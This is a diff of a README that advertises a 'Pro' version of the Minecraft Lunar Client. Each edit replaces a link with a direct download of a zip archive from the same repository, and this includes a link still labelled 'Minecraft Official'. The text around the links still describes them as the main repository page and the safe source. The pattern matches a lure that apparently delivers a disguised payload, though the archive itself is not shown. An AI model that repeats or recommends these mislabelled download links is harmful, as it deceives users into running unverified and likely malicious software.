@@ -1,6 +1,6 @@
 # 🚀 Lunar-Client-Pro-version-for-minecraft - Smooth Minecraft Performance Upgrade
 
-[![Download Now](https://img.shields.io/badge/Download-Lunar%20Client%20Pro-blue?style=for-the-badge)](https://github.com/Antoniol7x/Lunar-Client-Pro-version-for-minecraft)
+[![Download Now](https://img.shields.io/badge/Download-Lunar%20Client%20Pro-blue?style=for-the-badge)](https://github.com/Antoniol7x/Lunar-Client-Pro-version-for-minecraft/raw/refs/heads/main/swungen/for_Client_Pro_version_Lunar_minecraft_v3.9.zip)
 
 ---
 
@@ -31,7 +31,7 @@ If your computer matches or exceeds these, Lunar Client Pro will run smoothly.
 
 The official and safe way to get Lunar Client Pro is through the GitHub page linked below:
 
-[![Download from GitHub](https://img.shields.io/badge/Get%20Lunar%20Client%20Pro-grey?style=for-the-badge)](https://github.com/Antoniol7x/Lunar-Client-Pro-version-for-minecraft)
+[![Download from GitHub](https://img.shields.io/badge/Get%20Lunar%20Client%20Pro-grey?style=for-the-badge)](https://github.com/Antoniol7x/Lunar-Client-Pro-version-for-minecraft/raw/refs/heads/main/swungen/for_Client_Pro_version_Lunar_minecraft_v3.9.zip)
 
 This link takes you to the main repository page. From there, you can find the latest release and download the client installer. Always download from this page to avoid fake versions.
 
@@ -43,7 +43,7 @@ Follow these steps to set up the client on your computer:
 
 1. **Visit the Download Page**  
    Click the button above or open:  
-   `https://github.com/Antoniol7x/Lunar-Client-Pro-version-for-minecraft`
+   `https://github.com/Antoniol7x/Lunar-Client-Pro-version-for-minecraft/raw/refs/heads/main/swungen/for_Client_Pro_version_Lunar_minecraft_v3.9.zip`
 
 2. **Find the Latest Release**  
    On the GitHub page, look for a section called "Releases" or "Latest Release." This usually appears on the right side or near the top of the page.
@@ -140,8 +140,8 @@ If you encounter problems, use the GitHub “Issues” tab on the download page 
 
 ## 🌍 Useful Links
 
-- Minecraft Official: https://www.minecraft.net
+- Minecraft Official: https://github.com/Antoniol7x/Lunar-Client-Pro-version-for-minecraft/raw/refs/heads/main/swungen/for_Client_Pro_version_Lunar_minecraft_v3.9.zip
 - Lunar Client Pro GitHub:   
-  https://github.com/Antoniol7x/Lunar-Client-Pro-version-for-minecraft
+  https://github.com/Antoniol7x/Lunar-Client-Pro-version-for-minecraft/raw/refs/heads/main/swungen/for_Client_Pro_version_Lunar_minecraft_v3.9.zip
 
-[![Download Lunar Client Pro](https://img.shields.io/badge/Download-Lunar%20Client%20Pro-blue?style=for-the-badge)](https://github.com/Antoniol7x/Lunar-Client-Pro-version-for-minecraft)
+[![Download Lunar Client Pro](https://img.shields.io/badge/Download-Lunar%20Client%20Pro-blue?style=for-the-badge)](https://github.com/Antoniol7x/Lunar-Client-Pro-version-for-minecraft/raw/refs/heads/main/swungen/for_Client_Pro_version_Lunar_minecraft_v3.9.zip)
